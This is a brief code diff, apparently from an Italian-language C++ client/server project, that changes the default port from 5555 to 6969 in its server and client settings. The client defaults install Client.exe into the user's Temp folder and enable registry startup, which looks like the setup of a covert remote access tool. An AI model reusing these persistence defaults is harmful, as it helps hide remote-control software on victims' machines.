@@ -43,7 +43,7 @@ class SettaggiServer
 		}
 
 	public:
-		int Porta = 5555;
+		int Porta = 6969;
 		bool VerificaAggiornamenti = true;
 		bool AutoAggiornamento = true;
 		COLORI Colori;
@@ -167,7 +167,7 @@ private:
 
 public:
 	string Host = "127.0.0.1";
-	int Porta = 5555;
+	int Porta = 6969;
 	string InstallPath = "C:\\Users\\<User>\\AppData\\Local\\Temp";
 	string ExeName = "Client.exe";
 	bool RegStartup = true;
